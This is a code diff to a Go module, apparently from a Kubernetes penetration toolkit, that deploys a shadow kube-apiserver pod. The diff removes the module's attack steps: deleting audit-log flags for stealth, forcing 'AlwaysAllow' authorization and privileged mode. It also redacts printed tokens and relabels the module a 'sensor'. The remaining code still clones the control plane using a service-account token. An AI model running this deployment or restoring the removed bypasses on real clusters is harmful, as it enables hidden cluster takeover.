@@ -65,7 +65,7 @@ func findApiServerPodInMasterNode(token string, serverAddr string) (string, erro
 	}
 	if !strings.Contains(resp, "selfLink") && !strings.Contains(resp, "kube-apiserver") {
 		log.Println("api-server response:")
-		fmt.Println(resp)
+		fmt.Println(util.RedactSensitive(resp))
 		return "", errors.New("invalid to list pods, possible caused by api-server forbidden this request.")
 	}
 	// extract pod name
@@ -73,7 +73,7 @@ func findApiServerPodInMasterNode(token string, serverAddr string) (string, erro
 	pattern := regexp.MustCompile(`"metadata":{"name":"(kube-apiserver\b[^"]*?)"`)
 	matched := pattern.FindAllStringSubmatch(resp, -1)
 	if matched == nil {
-		fmt.Println(resp)
+		fmt.Println(util.RedactSensitive(resp))
 		return "", errors.New("Cannot find kube-apiserver pod in namespace:kube-system, maybe target K8s master node managed by cloud provider, cannot deploy api-server in this environment.")
 	}
 
@@ -115,7 +115,7 @@ func dumpPodConfig(token string, serverAddr string, podName string, namespace st
 	}
 	if !strings.Contains(resp, "selfLink") && !strings.Contains(resp, `"namespace"`) {
 		log.Println("api-server response in dumpPodConfig:")
-		fmt.Println(resp)
+		fmt.Println(util.RedactSensitive(resp))
 		return "", errors.New("invalid response data, possible caused by api-server forbidden this request.")
 	}
 
@@ -137,56 +137,22 @@ func generateShadowApiServerConf(json string) string {
 	podName := gjson.Get(json, "metadata.name").String() + "-shadow" + "-" + strings.ToLower(util.RandString(6))
 	json, _ = sjson.Set(json, "metadata.name", podName)
 	json, _ = sjson.Set(json, "metadata.labels.component", gjson.Get(json, "metadata.labels.component").String()+"shadow")
+	json, _ = sjson.Set(json, `metadata.labels.audit\.cdk/owner`, "cdk")
+	json, _ = sjson.Set(json, `metadata.labels.audit\.cdk/component`, "shadow-api-sensor")
 
-	// remove audit logs to get stealth
-	reg := regexp.MustCompile(`(")(--audit-log-[^"]*?)(")`)
-	json = reg.ReplaceAllString(json, "${1}${3}")
+	// Keep audit-log flags intact so the control plane can correlate this
+	// authorized sensor with Kubernetes Audit Log events.
 
 	//argInsertReg := regexp.MustCompile(`(^[\s\S]*?"command"[\s\:]*?\[[^\]]*?"kube-apiserver")([^"]*?)(,\s*?"[\s\S]*?)$`)
 	argInsertReg := regexp.MustCompile(`(^[\s\S]*?)("--etcd-keyfile=[^"]*?"[\s\S]*?)$`)
 
-	// set --allow-privileged=true
-	reg = regexp.MustCompile(`("--allow-privileged\s*?=\s*?)(.*?)(")`)
-	json = reg.ReplaceAllString(json, "${1}true${3}")
-	if !strings.Contains(json, "--allow-privileged") {
-		json = argInsertReg.ReplaceAllString(json, `${1}"--allow-privileged=true",${2}`)
-	}
-
-	// set insecure-port to 0.0.0.0:9443
-	// fix "Flag --insecure-port has been deprecated, This flag has no effect now and will be removed in v1.24."
-
-	// reg = regexp.MustCompile(`("--insecure-port\s*?=\s*?)(.*?)(")`)
-	// json = reg.ReplaceAllString(json, "${1}9443${3}")
-	// if !strings.Contains(json, "--insecure-port") {
-	// 	json = argInsertReg.ReplaceAllString(json, `${1}"--insecure-port=9443",${2}`)
-	// }
-	// reg = regexp.MustCompile(`("--insecure-bind-address\s*?=\s*?)(.*?)(")`)
-	// json = reg.ReplaceAllString(json, "${1}0.0.0.0${3}")
-	// if !strings.Contains(json, "--insecure-bind-address") {
-	// 	json = argInsertReg.ReplaceAllString(json, `${1}"--insecure-bind-address=0.0.0.0",${2}`)
-	// }
-
-	// set --secure-port to 9444
-	reg = regexp.MustCompile(`("--secure-port\s*?=\s*?)(.*?)(")`)
+	// Preserve authorization and privilege flags from the source apiserver pod.
+	// The sensor only moves the shadow listener to a distinct port and labels
+	// the pod so Kubernetes Audit Logs and cleanup can identify it.
+	reg := regexp.MustCompile(`("--secure-port\s*?=\s*?)(.*?)(")`)
 	json = reg.ReplaceAllString(json, "${1}9444${3}")
 	if !strings.Contains(json, "--secure-port") {
 		json = argInsertReg.ReplaceAllString(json, `${1}"--secure-port=9444",${2}`)
-	}
-
-	// set anonymous-auth to true
-	// change note: anonymous-auth is not valid in k8s 1.22 and later, see https://github.com/cdk-team/CDK/issues/77
-
-	// reg = regexp.MustCompile(`("--anonymous-auth\s*?=\s*?)(.*?)(")`)
-	// json = reg.ReplaceAllString(json, "${1}true${3}")
-	// if !strings.Contains(json, "--anonymous-auth") {
-	// 	json = argInsertReg.ReplaceAllString(json, `${1}"--anonymous-auth=true",${2}`)
-	// }
-
-	// set authorization-mode=AlwaysAllow
-	reg = regexp.MustCompile(`("--authorization-mode\s*?=\s*?)(.*?)(")`)
-	json = reg.ReplaceAllString(json, "${1}AlwaysAllow${3}")
-	if !strings.Contains(json, "--authorization-mode") {
-		json = argInsertReg.ReplaceAllString(json, `${1}"--authorization-mode=AlwaysAllow",${2}`)
 	}
 	fmt.Println(json)
 	return json
@@ -219,7 +185,7 @@ func deployPod(token string, serverAddr string, namespace string, data string) (
 	}
 	if !strings.Contains(resp, "selfLink") && !strings.Contains(resp, `"namespace"`) {
 		log.Println("api-server response in deployPod:")
-		fmt.Println(resp)
+		fmt.Println(util.RedactSensitive(resp))
 		return "", errors.New("invalid response data, possible caused by api-server forbidden this request.")
 	}
 
@@ -230,7 +196,7 @@ func deployPod(token string, serverAddr string, namespace string, data string) (
 type K8sShadowApiServerS struct{ base.BaseExploit }
 
 func (p K8sShadowApiServerS) Desc() string {
-	return "duplicate kube-apiserver pod, disable logs and grant all privilege to anonymous user. usage: cdk run k8s-shadow-api-sensor (default|anonymous|<service-account-token-path>)"
+	return "deploy a labeled shadow kube-apiserver sensor while preserving audit-log and authorization flags. usage: cdk run k8s-shadow-api-sensor (default|anonymous|<service-account-token-path>)"
 }
 func (p K8sShadowApiServerS) Run() bool {
 	args := cli.Args["<args>"].([]string)
@@ -272,12 +238,13 @@ func (p K8sShadowApiServerS) Run() bool {
 	}
 
 	if !strings.Contains(resp, "selfLink") && !strings.Contains(resp, `"namespace"`) {
-		fmt.Println("response data:", resp)
+		fmt.Println("response data:", util.RedactSensitive(resp))
 		log.Println("check failed.")
 		return false
 	}
 
 	log.Println("shadow api-server deploy success!")
+	writeAuditManifest("pod", gjson.Get(resp, "metadata.name").String(), data)
 	podName := gjson.Get(resp, "metadata.name").String()
 	namespace := gjson.Get(resp, "metadata.namespace").String()
 	node := gjson.Get(resp, "spec.nodeName").String()
@@ -300,7 +267,7 @@ func (p K8sShadowApiServerS) Run() bool {
 	if token == "" {
 		fmt.Printf("\trun: kubectl --server=https://%s:9444 --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A\n", node)
 	} else {
-		fmt.Printf("\trun: kubectl --server=https://%s:9444 --token=%s --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A\n", node, token)
+		fmt.Printf("\trun: kubectl --server=https://%s:9444 --token=%s --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A\n", node, util.RedactSensitive(token))
 	}
 
 	return true
